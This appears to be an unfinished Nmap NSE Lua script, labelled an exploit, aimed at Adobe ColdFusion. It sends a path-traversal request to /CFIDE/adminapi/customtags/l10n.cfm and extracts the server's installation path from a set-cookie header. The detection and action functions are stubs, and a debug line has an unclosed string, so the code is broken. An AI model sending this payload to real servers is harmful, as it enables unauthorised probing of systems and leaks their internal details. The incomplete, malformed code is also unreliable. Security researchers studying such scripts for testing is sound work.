description = [[
Coldfusion-subzero exploit.
]]

---
-- @usage
-- 
-- @output
--
-- @args
--
---

author = "Paulino Calderon <calderon@websec.mx>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"exploit"}

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"

portrule = shortport.http

local PATH_PAYLOAD = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it&attributes.file=../../administrator/analyzer/index.cfm&attributes.locale=it&attributes.var=it&attributes.jscript=false&attributes.type=text/html&attributes.charset=UTF-8&thisTag.executionmode=end&thisTag.generatedContent=htp"

local function detect()

end

---
-- Extracts absolute path of installation by reading the ANALIZER_DIRECTORY value from the header 'set-cookie'
--
local function get_installation_path(host, port, basepath)
  local req = http.get(host, port, basepath..PATH_PAYLOAD)
  if req.header['set-cookie'] then
    stdnse.print_debug(1, "%s:Header 'set-cookie' detected in response.", SCRIPT_NAME)
    local _, _, path = string.find(req.header['set-cookie'], "path=/, ANALYZER_DIRECTORY=(.-);path=/")
    stdnse.print_debug(1, "%s: Extracted path:%s, SCRIPT_NAME, path)
    return path
  end
  return nil
end

action = function(host, port)
  local basepath = stdnse.get_script_args(SCRIPT_NAME..".basepath") or "/"
  local installation_path = get_installation_path(host, port, basepath)

end
